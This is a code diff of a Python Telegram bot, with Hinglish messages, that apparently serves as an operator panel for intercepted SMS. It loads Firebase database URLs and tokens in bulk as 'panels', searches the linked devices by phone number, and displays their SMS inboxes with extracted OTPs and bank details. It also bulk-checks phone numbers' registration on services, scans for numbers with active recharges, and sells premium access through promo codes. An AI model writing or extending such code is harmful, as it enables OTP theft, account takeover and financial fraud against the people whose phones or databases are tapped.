-        if not devices: devices = await get_all_devices(bot_token, 0, users_db)
-        found_devs = [d for d in devices for term in search_terms if any(term in num for num in d.numbers)]
-        if not found_devs:
-            await safe_edit(wait_msg, "No matching numbers found in any panel.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
-            return
-            
-        if len(found_devs) == 1:
-            device = found_devs[0]
-            user_focus.setdefault(bot_token, {})[chat_id] = device.id
-            label = device_label(device)
-            smss  = await get_device_sms(device)
-            back_btn = InlineKeyboardButton("Back to Home", callback_data="home")
-            refresh_btn = InlineKeyboardButton("🔄 Refresh", callback_data=f"msgs:{device.id}:search")
-            if not smss:
-                await safe_edit(wait_msg, f"{label}\n\nKoi SMS nahi mili.", reply_markup=InlineKeyboardMarkup([[refresh_btn, back_btn]]))
+            if found_count == 0:
+                await safe_edit(wait_msg, "Scanning complete. Koi active recharge wala hidden number nahi mila.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Home", callback_data="home")]]))
                 return
-            header = f"ALL MESSAGES INBOX (SMS & OTP)\n━━━━━━━━━━━━━━━━━━\nNumber: {label}\nShowing: {len(smss)} messages\n━━━━━━━━━━━━━━━━━━\n\n"
-            body_parts, otp_buttons = [], []
-            for sms in smss[:15]:
-                block, otp, bank_info = format_sms_block(sms, label)
-                body_parts.append(block)
-                if otp: otp_buttons.append([InlineKeyboardButton(f"Copy OTP: {otp}", callback_data=f"cp:{otp}")])
-            full_text = header + ("\n━━━━━━━━━━━━━━━━━━\n\n").join(body_parts)
-            if len(full_text) > 4000: full_text = full_text[:4000] + "\n\n...[Truncated]"
-            otp_buttons.append([refresh_btn, back_btn])
-            await safe_edit(wait_msg, full_text, reply_markup=InlineKeyboardMarkup(otp_buttons))
-            return
-            
-        rows, row = [], []
-        for d in found_devs[:16]:
-            row.append(InlineKeyboardButton(_format_btn_label(d), callback_data=f"msgs:{d.id}"))
-            if len(row) == 2:
-                rows.append(row)
-                row = []
-        if row: rows.append(row)
-        rows.append([InlineKeyboardButton("Back to Home", callback_data="home")])
-        await safe_edit(wait_msg, f"Search Results for: {', '.join(search_terms)}\nDirectly open inbox:", reply_markup=InlineKeyboardMarkup(rows))
-        return
-
-    if action == "check_number_input":
-        raw_nums = re.sub(r"\D", " ", text).split()
-        target_nums = list(set([num[-10:] for num in raw_nums if len(num) >= 10]))
-        if not target_nums: return await update.message.reply_text("❌ Invalid input!")
-        service = state["service"]
-        pending_action.pop(chat_id)
-        
-        if len(target_nums) == 1:
-            number = target_nums[0]
-            wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Checking {number}...")
-            res = await check_number_api(service, number)
-            is_error = res.get("status") == "error"; ms = res.get("ms", 0)
-            is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
-            res_text = format_checker_result(service, number, is_reg, ms, is_error, res.get("message", ""))
-            kb = []
-            if not is_reg and not is_error: kb.append([InlineKeyboardButton("🔍 Find this Number in Panels", callback_data=f"search_num:{number}")])
-            kb.append([InlineKeyboardButton("🔄 Check Another", callback_data=f"chk_srv:{service}"), InlineKeyboardButton("🏠 Select Checker", callback_data="open_checker_menu")])
-            await safe_edit(wait_msg, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
-        else:
-            total_bulk = len(target_nums)
-            wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Bulk Checking {total_bulk} numbers on {service.capitalize()}...")
-            bulk_results, registered_list = [], []
-            for i in range(0, total_bulk, 100):
-                batch = target_nums[i:i+100]
-                tasks = [check_number_api(service, num) for num in batch]
-                res_list = await asyncio.gather(*tasks, return_exceptions=True)
-                for num, res in zip(batch, res_list):
-                    if isinstance(res, Exception) or res.get("status") == "error":
-                        bulk_results.append(f"❌ <code>{num}</code> - Error"); continue
-                    is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
-                    bulk_results.append(f"{'🔴' if is_reg else '🟢'} <code>{num}</code> - {'Reg' if is_reg else 'UNREG'}")
-                    if is_reg: registered_list.append(num)
-                await asyncio.sleep(0.5)
-            res_text = f"<b>📊 BULK CHECK RESULTS ({service.upper()})</b>\n━━━━━━━━━━━━━━━━━━\n" + "\n".join(bulk_results)
-            if len(res_text) > 4000: res_text = res_text[:4000] + "\n...[Truncated]"
-            kb = [[InlineKeyboardButton("🔄 Check Another", callback_data=f"chk_srv:{service}"), InlineKeyboardButton("🏠 Select Checker", callback_data="open_checker_menu")]]
-            await safe_edit(wait_msg, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
-        return
-
-    if action == "sa_set_global_panel" and chat_id in ADMIN_IDS:
-        pending_action.pop(chat_id)
-        lines = text.split('\n')
-        added = 0
-        for line in lines:
-            parts = line.split('|')
-            url = parts[0].strip()
-            if url.startswith("http"):
-                auth = parts[1].strip() if len(parts) > 1 else None
-                SETTINGS.setdefault("global_panels", []).append({"url": url, "auth": auth})
-                added += 1
-        save_settings()
-        await update.message.reply_text(f"SUCCESS! {added} panels Global Default list me add ho gaye hain.")
-        return
-
-    if action == "set_personal_db":
-        lines = text.split('\n')
-        pending_action.pop(chat_id)
-        expiry_time = time.time() + (86400 * 365) 
-        
-        added = 0
-        for line in lines:
-            parts = line.split('|')
-            url = parts[0].strip()
-            if url.startswith("http"):
-                auth = parts[1].strip() if len(parts) > 1 else None
-                users_db.setdefault(chat_id, {}).setdefault("custom_dbs", []).append({"url": url, "auth": auth, "expiry": expiry_time})
-                added += 1
                 
-        if added > 0:
-            await update.message.reply_text(f"✅ {added} Firebase URLs added successfully with Auth Support!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Home", callback_data="home")]]), parse_mode="HTML")
-        else:
-            await update.message.reply_text("❌ No valid URLs found.")
-        return
+            kb.append([InlineKeyboardButton("Back to Home", callback_data="home")])
+            results_text = "DEEP SCAN RESULTS (Premium)\n━━━━━━━━━━━━━━━━━━\n\n" + "\n".join(results)
+            if len(results_text) > 4000: results_text = results_text[:4000] + "\n\n...[Truncated]"
+            await safe_edit(wait_msg, results_text, reply_markup=InlineKeyboardMarkup(kb))
+            return
 
-# ═══════════════════════════════════════════════════════
-#  FIREBASE AUTO-GEN WORKER POOL ENGINE (GHOST)
-# ═══════════════════════════════════════════════════════
+        if text == "Check Status" and chat_id in ADMIN_IDS:
+            online_count = sum(1 for d in GLOBAL_DEVICE_CACHE.get("ALL", []) if d.status == "online")
+            msg = f"📊 <b>SERVER HEALTH STATUS</b>\n━━━━━━━━━━━━━━━━━━\n" \
+                  f"🔗 Auto-Loaded Panels: {len(RAW_URLS)}\n" \
+                  f"📱 Total Devices in Cache: {len(GLOBAL_DEVICE_CACHE.get('ALL', []))}\n" \
+                  f"🟢 Online Devices: {online_count}\n" \
+                  f"👤 Total Bot Users: {len(all_users)}\n" \
+                  f"📩 Total OTPs Processed: {total_otps_processed}\n" \
+                  f"👻 Active Background Workers: {len(ACTIVE_WORKERS)}"
+            await update.message.reply_text(msg, parse_mode="HTML")
+            return
+
+        if text == "🎁 Redeem Promo":
+            pending_action[chat_id] = {"action": "redeem_promo"}
+            await update.message.reply_text("🎁 <b>REDEEM PROMO CODE</b>\n━━━━━━━━━━━━━━━━━━\nApna Promo Code niche type karein:\n\nCancel: /cancel", parse_mode="HTML")
+            return
+
+        if text.startswith("💳 Add Panel") or text.startswith("Add Panel"):
+            pending_action[chat_id] = {"action": "set_personal_db"}
+            await update.message.reply_text("💳 ADD CUSTOM PANEL (VANTAGE MODE)\n━━━━━━━━━━━━━━━━━━\nApne Firebase URLs bhejein (URL|AuthToken format).\nExample:\nhttps://sannn-5d617-default-rtdb.firebaseio.com|tHe daRk\n\nCancel: /cancel")
+            return
+
+        if text == "Admin Panel" and chat_id in ADMIN_IDS:
+            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
+            total_u = len(all_users)
+            msg = f"ADMIN PANEL (Private)\n━━━━━━━━━━━━━━━━━━\nTotal Users    : {total_u}\n━━━━━━━━━━━━━━━━━━\nUpdated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
+            await update.message.reply_text(msg, reply_markup=admin_keyboard())
+            return
+
+        if text.lower() in ("/cancel", "cancel"):
+            if chat_id in pending_action:
+                pending_action.pop(chat_id)
+                await update.message.reply_text("Action cancelled.", reply_markup=get_reply_menu(chat_id))
+            else: await update.message.reply_text("No pending action to cancel.")
+            return
+
+        if update.message.document:
+            state = pending_action.get(chat_id)
+            if state and state.get("action") == "upload_panels_txt" and chat_id in ADMIN_IDS:
+                doc = update.message.document
+                if not doc.file_name.endswith('.txt'):
+                    await update.message.reply_text("❌ Please send a valid .txt file.")
+                    return
+                
+                wait_msg = await update.message.reply_text("⏳ Processing file, extracting URLs...")
+                try:
+                    file = await ctx.bot.get_file(doc.file_id)
+                    file_content = await file.download_as_bytearray()
+                    text_data = file_content.decode('utf-8', errors='ignore')
+                    
+                    pattern = re.compile(r'https?://[a-zA-Z0-9-]+\.(?:firebaseio\.com|[a-zA-Z0-9-]+\.firebasedatabase\.app)')
+                    urls = list(set(pattern.findall(text_data)))
+                    
+                    if not urls:
+                        await safe_edit(wait_msg, "❌ Is file mein koi valid Firebase URLs nahi mile.")
+                        return
+                        
+                    existing = SETTINGS.setdefault("global_panels", [])
+                    added_count = 0
+                    for u in urls:
+                        if u not in existing and u not in RAW_URLS:
+                            existing.append(u)
+                            added_count += 1
+                            
+                    save_settings()
+                    pending_action.pop(chat_id)
+                    
+                    for u in urls:
+                        try:
+                            WORK_QUEUE.put_nowait(("INIT", f"G_TXT_{int(time.time())}_{added_count}", {"url": u, "auth": None}))
+                        except asyncio.QueueFull: pass
+                        
+                    await safe_edit(wait_msg, f"✅ <b>SUCCESS!</b>\n━━━━━━━━━━━━━━━━━━\nTotal URLs Extracted: {len(urls)}\nNewly Added to Global: {added_count}\n\n<i>Ab ye saare panels background me active ho gaye hain!</i>", parse_mode="HTML")
+                except Exception as e:
+                    await safe_edit(wait_msg, f"❌ Error processing file: {str(e)}")
+            return
+
+        state = pending_action.get(chat_id)
+        if not state: return
+
+        action = state.get("action")
+        if action == "redeem_promo":
+            pending_action.pop(chat_id)
+            if text.upper() == "HACKER50":
+                all_users[chat_id]["access_until"] = time.time() + 3600
+                save_user(chat_id)
+                await update.message.reply_text("🎉 <b>Promo Redeemed!</b> Aapko 1 Hour ka Extra VIP Access mil gaya hai.", parse_mode="HTML")
+            else:
+                await update.message.reply_text("❌ Invalid or Expired Promo Code.")
+            return
+
+        if action == "search_number":
+            pending_action.pop(chat_id)
+            search_terms = [re.sub(r"\D", "", t) for t in text.replace(",", " ").split() if len(re.sub(r"\D", "", t)) >= 4]
+            if not search_terms:
+                await update.message.reply_text("Enter at least 4 digits to search.")
+                return
+            wait_msg = await update.message.reply_text("Searching across all global and user databases...")
+            devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
+            if not devices: devices = await get_all_devices(bot_token, 0, users_db)
+            found_devs = [d for d in devices for term in search_terms if any(term in num for num in d.numbers)]
+            if not found_devs:
+                await safe_edit(wait_msg, "No matching numbers found in any panel.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
+                return
+                
+            if len(found_devs) == 1:
+                device = found_devs[0]
+                user_focus.setdefault(bot_token, {})[chat_id] = device.id
+                label = device_label(device)
+                smss  = await get_device_sms(device)
+                back_btn = InlineKeyboardButton("Back to Home", callback_data="home")
+                refresh_btn = InlineKeyboardButton("🔄 Refresh", callback_data=f"msgs:{device.id}:search")
+                if not smss:
+                    await safe_edit(wait_msg, f"{label}\n\nKoi SMS nahi mili.", reply_markup=InlineKeyboardMarkup([[refresh_btn, back_btn]]))
+                    return
+                header = f"ALL MESSAGES INBOX (SMS & OTP)\n━━━━━━━━━━━━━━━━━━\nNumber: {label}\nShowing: {len(smss)} messages\n━━━━━━━━━━━━━━━━━━\n\n"
+                body_parts, otp_buttons = [], []
+                for sms in smss[:15]:
+                    block, otp, bank_info = format_sms_block(sms, label)
+                    body_parts.append(block)
+                    if otp: otp_buttons.append([InlineKeyboardButton(f"Copy OTP: {otp}", callback_data=f"cp:{otp}")])
+                full_text = header + ("\n━━━━━━━━━━━━━━━━━━\n\n").join(body_parts)
+                if len(full_text) > 4000: full_text = full_text[:4000] + "\n\n...[Truncated]"
+                otp_buttons.append([refresh_btn, back_btn])
+                await safe_edit(wait_msg, full_text, reply_markup=InlineKeyboardMarkup(otp_buttons))
+                return
+                
+            rows, row = [], []
+            for d in found_devs[:16]:
+                row.append(InlineKeyboardButton(_format_btn_label(d), callback_data=f"msgs:{d.id}"))
+                if len(row) == 2:
+                    rows.append(row)
+                    row = []
+            if row: rows.append(row)
+            rows.append([InlineKeyboardButton("Back to Home", callback_data="home")])
+            await safe_edit(wait_msg, f"Search Results for: {', '.join(search_terms)}\nDirectly open inbox:", reply_markup=InlineKeyboardMarkup(rows))
+            return
+
+        if action == "check_number_input":
+            raw_nums = re.sub(r"\D", " ", text).split()
+            target_nums = list(set([num[-10:] for num in raw_nums if len(num) >= 10]))
+            if not target_nums: return await update.message.reply_text("❌ Invalid input!")
+            service = state["service"]
+            pending_action.pop(chat_id)
+            
+            if len(target_nums) == 1:
+                number = target_nums[0]
+                wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Checking {number}...")
+                res = await check_number_api(service, number)
+                is_error = res.get("status") == "error"; ms = res.get("ms", 0)
+                is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
+                res_text = format_checker_result(service, number, is_reg, ms, is_error, res.get("message", ""))
+                kb = []
+                if not is_reg and not is_error: kb.append([InlineKeyboardButton("🔍 Find this Number in Panels", callback_data=f"search_num:{number}")])
+                kb.append([InlineKeyboardButton("🔄 Check Another", callback_data=f"chk_srv:{service}"), InlineKeyboardButton("🏠 Select Checker", callback_data="open_checker_menu")])
+                await safe_edit(wait_msg, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
+            else:
+                total_bulk = len(target_nums)
+                wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Bulk Checking {total_bulk} numbers on {service.capitalize()}...")
+                bulk_results, registered_list = [], []
+                for i in range(0, total_bulk, 100):
+                    batch = target_nums[i:i+100]
+                    tasks = [check_number_api(service, num) for num in batch]
+                    res_list = await asyncio.gather(*tasks, return_exceptions=True)
+                    for num, res in zip(batch, res_list):
+                        if isinstance(res, Exception) or res.get("status") == "error":
+                            bulk_results.append(f"❌ <code>{num}</code> - Error"); continue
+                        is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
+                        bulk_results.append(f"{'🔴' if is_reg else '🟢'} <code>{num}</code> - {'Reg' if is_reg else 'UNREG'}")
+                        if is_reg: registered_list.append(num)
+                    await asyncio.sleep(0.5)
+                res_text = f"<b>📊 BULK CHECK RESULTS ({service.upper()})</b>\n━━━━━━━━━━━━━━━━━━\n" + "\n".join(bulk_results)
+                if len(res_text) > 4000: res_text = res_text[:4000] + "\n...[Truncated]"
+                kb = [[InlineKeyboardButton("🔄 Check Another", callback_data=f"chk_srv:{service}"), InlineKeyboardButton("🏠 Select Checker", callback_data="open_checker_menu")]]
+                await safe_edit(wait_msg, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
+            return
+
+        if action == "sa_set_global_panel" and chat_id in ADMIN_IDS:
+            pending_action.pop(chat_id)
+            lines = text.split('\n')
+            added = 0
+            for line in lines:
+                parts = line.split('|')
+                url = parts[0].strip()
+                if url.startswith("http"):
+                    auth = parts[1].strip() if len(parts) > 1 else None
+                    SETTINGS.setdefault("global_panels", []).append({"url": url, "auth": auth})
+                    added += 1
+            save_settings()
+            await update.message.reply_text(f"SUCCESS! {added} panels Global Default list me add ho gaye hain.")
+            return
+
+        if action == "set_personal_db":
+            lines = text.split('\n')
+            pending_action.pop(chat_id)
+            expiry_time = time.time() + (86400 * 365) 
+            
+            added = 0
+            for line in lines:
+                parts = line.split('|')
+                url = parts[0].strip()
+                if url.startswith("http"):
+                    auth = parts[1].strip() if len(parts) > 1 else None
+                    users_db.setdefault(chat_id, {}).setdefault("custom_dbs", []).append({"url": url, "auth": auth, "expiry": expiry_time})
+                    added += 1
+                    
+            if added > 0:
+                await update.message.reply_text(f"✅ {added} Firebase URLs added successfully with Auth Support!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Home", callback_data="home")]]), parse_mode="HTML")
+            else:
+                await update.message.reply_text("❌ No valid URLs found.")
+            return
+
+    except Exception as e:
+        err_msg = traceback.format_exc()
+        try:
+            await update.message.reply_text(f"⚠️ <b>MESSAGE ERROR:</b>\n<pre>{html.escape(err_msg[-3000:])}</pre>", parse_mode="HTML")
+        except: pass
+
+# ==========================================
+# ⚡ FIREBASE AUTO-GEN WORKER POOL ENGINE
+# ==========================================
 
 async def fetch_recent_sms_safely(d: Device, silent=False):
     try:
